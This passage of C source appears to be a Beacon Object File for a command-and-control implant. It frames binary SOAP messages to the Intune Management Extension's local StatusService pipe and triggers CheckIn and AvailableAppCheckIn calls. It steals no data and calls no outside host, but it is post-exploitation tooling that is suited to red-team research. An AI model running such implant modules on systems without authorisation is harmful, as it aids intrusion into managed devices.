                            const GUID *msg_id, const GUID *checkin_guid)
{
    BYTE  env[512];
    DWORD n = 0, o = 0;
    DWORD oplen = (DWORD)bof_strlen(op);
    DWORD plen  = (DWORD)bof_strlen(ACTION_PREFIX);
    DWORD vlen  = (DWORD)bof_strlen(VIA_URI);
    DWORD nslen = (DWORD)bof_strlen(TEMPURI_NS);
    DWORD alen  = plen + oplen;

    if (alen > 0xFF || oplen > 0x7F)
        return 0;

    /* <s:Envelope xmlns:s=soap12 xmlns:a=wsa10> */
    env[n++] = 0x56; env[n++] = 0x02;
    env[n++] = 0x0B; env[n++] = 0x01; env[n++] = 's'; env[n++] = 0x04;
    env[n++] = 0x0B; env[n++] = 0x01; env[n++] = 'a'; env[n++] = 0x06;

    /* <s:Header> */
    env[n++] = 0x56; env[n++] = 0x08;

    /* <a:Action s:mustUnderstand="1">ACTION</a:Action> */
    env[n++] = 0x44; env[n++] = 0x0A;
    env[n++] = 0x1E; env[n++] = 0x00; env[n++] = 0x82;
    env[n++] = 0x99; env[n++] = (BYTE)alen;
    bof_memcpy(env + n, ACTION_PREFIX, plen); n += plen;
    bof_memcpy(env + n, op, oplen); n += oplen;

    /* <a:MessageID>urn:uuid:...</a:MessageID> */
    env[n++] = 0x44; env[n++] = 0x1A; env[n++] = 0xAD;
    bof_memcpy(env + n, msg_id, 16); n += 16;

    /* <a:ReplyTo><a:Address>anonymous</a:Address></a:ReplyTo> */
    env[n++] = 0x44; env[n++] = 0x2C;
    env[n++] = 0x44; env[n++] = 0x2A; env[n++] = 0xAB; env[n++] = 0x14;
    env[n++] = 0x01;

    /* <a:To s:mustUnderstand="1">VIA</a:To> */
    env[n++] = 0x44; env[n++] = 0x0C;
    env[n++] = 0x1E; env[n++] = 0x00; env[n++] = 0x82;
    env[n++] = 0x99; env[n++] = (BYTE)vlen;
    bof_memcpy(env + n, VIA_URI, vlen); n += vlen;

    /* </s:Header> <s:Body> */
    env[n++] = 0x01;
    env[n++] = 0x56; env[n++] = 0x0E;

    /* <OP xmlns="http://tempuri.org/"> */
    env[n++] = 0x40; env[n++] = (BYTE)oplen;
    bof_memcpy(env + n, op, oplen); n += oplen;
    env[n++] = 0x08; env[n++] = (BYTE)nslen;
    bof_memcpy(env + n, TEMPURI_NS, nslen); n += nslen;

    /* <checkInGuid>GUID</checkInGuid> */
    env[n++] = 0x40; env[n++] = 0x0B;
    bof_memcpy(env + n, "checkInGuid", 11); n += 11;
    env[n++] = 0xB1;
    bof_memcpy(env + n, checkin_guid, 16); n += 16;

    /* </OP></s:Body></s:Envelope> */
    env[n++] = 0x01; env[n++] = 0x01; env[n++] = 0x01;

    /* 06 <mb31 size> 00 <env>; size counts the string table byte. */
    if (cap < n + 8)
        return 0;
    out[o++] = NMF_SIZED_ENVELOPE;
    o += mb31_encode(n + 1, out + o);
    out[o++] = 0x00;
    bof_memcpy(out + o, env, n);
    o += n;
    return o;
}

/* ----------------------------------------------------------------------------
 * One operation
 * -------------------------------------------------------------------------- */

static BOOL do_call(const wchar_t *pipe_name, const char *op)
{
    SESSION s;
    BYTE    msg[600];
    DWORD   mlen, hdr, size = 0, used;
    GUID    msg_id, ck;
    char    gs[40];
    char    resp_name[64];
    BOOL    ok = FALSE;
    BYTE    end = NMF_END;

    bof_memset(&s, 0, sizeof(s));
    s.hPipe = INVALID_HANDLE_VALUE;

    if (UuidCreate(&msg_id) != RPC_S_OK || UuidCreate(&ck) != RPC_S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] UuidCreate failed\n");
        return FALSE;
    }
    guid_to_str(&ck, gs);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s: connecting (checkInGuid %s)\n", op, gs);

    if (!session_open(&s, pipe_name))
        goto out;

    mlen = build_envelope(msg, sizeof(msg), op, &msg_id, &ck);
    if (!mlen) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build envelope\n");
        goto out;
    }
    if (!nns_send(&s, msg, mlen))
        goto out;

    /* Read the response record. */
    if (!pt_need(&s, 1))
        goto out;

    if (s.pt[0] == NMF_FAULT || s.pt[0] == NMF_END) {
        if (s.pt[0] == NMF_END) {
            BeaconPrintf(CALLBACK_ERROR, "[-] %s: server ended the session without a reply\n", op);
        } else {
            DWORD flen = 0;
            used = pt_mb31(&s, 1, &flen);
            if (used && flen < 1024 && pt_need(&s, 1 + used + flen)) {
                char fault[1024];
                bof_memcpy(fault, s.pt + 1 + used, flen);
                fault[flen] = '\0';
                BeaconPrintf(CALLBACK_ERROR, "[-] %s: NMF fault: %s\n", op, fault);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] %s: NMF fault record\n", op);
            }
        }
        goto out;
    }
    if (s.pt[0] != NMF_SIZED_ENVELOPE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] %s: unexpected response record 0x%02x\n", op, s.pt[0]);
        goto out;
    }
    used = pt_mb31(&s, 1, &size);
    if (!used || size > MAX_FRAME) {
        BeaconPrintf(CALLBACK_ERROR, "[-] %s: bad envelope size\n", op);
        goto out;
    }
    hdr = 1 + used;
    if (!pt_need(&s, hdr + size))
        goto out;

    bof_snprintf(resp_name, sizeof(resp_name), "%sResponse", op);
    resp_name[sizeof(resp_name) - 1] = '\0';

    if (mem_find(s.pt + hdr, size, resp_name)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: got %s (%lu bytes)\n", op, resp_name, size);
        ok = TRUE;
    } else if (mem_find(s.pt + hdr, size, "Fault") ||
               mem_find(s.pt + hdr, size, "fault")) {
        BeaconPrintf(CALLBACK_ERROR, "[-] %s: SOAP fault (%lu bytes)\n", op, size);
        dump_strings(s.pt + hdr, size);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] %s: unrecognized response (%lu bytes)\n", op, size);
        dump_strings(s.pt + hdr, size);
    }
    buf_consume(s.pt, &s.pt_len, hdr + size);

    /* Polite close. Failure here does not change the result. */
    nns_send(&s, &end, 1);

out:
    session_close(&s);
    return ok;
}

/* ----------------------------------------------------------------------------
 * Entry point
 * -------------------------------------------------------------------------- */

__declspec(dllexport) void go(const char *data, int len)
{
    datap   parser;
    char   *opstr = NULL;
    BOOL    do_checkin = TRUE, do_available = TRUE;
    wchar_t pipe_name[128];
    int     okc = 0, total = 0;

    BEACON_INIT;

    if (data && len > 0) {
        BeaconDataParse(&parser, (char *)data, len);
        opstr = BeaconDataExtract(&parser, NULL);
    }

    if (opstr && opstr[0]) {
        if (bof_stricmp(opstr, "checkin") == 0) {
            do_available = FALSE;
        } else if (bof_stricmp(opstr, "available") == 0) {
            do_checkin = FALSE;
        } else if (bof_stricmp(opstr, "both") != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Unknown operation '%s' (use checkin, available or both)\n", opstr);
            return;
        }
    }

    if (!resolve_pipe(pipe_name, sizeof(pipe_name) / sizeof(pipe_name[0]))) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Could not resolve IME StatusService pipe (is IntuneManagementExtension running?)\n");
        return;
    }

    if (do_checkin) {
        total++;
        if (do_call(pipe_name, "CheckIn"))
            okc++;
    }
    if (do_available) {
        total++;
        if (do_call(pipe_name, "AvailableAppCheckIn"))
            okc++;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done: %d of %d call(s) succeeded\n", okc, total);
}

BEACON_MAIN("z", go)
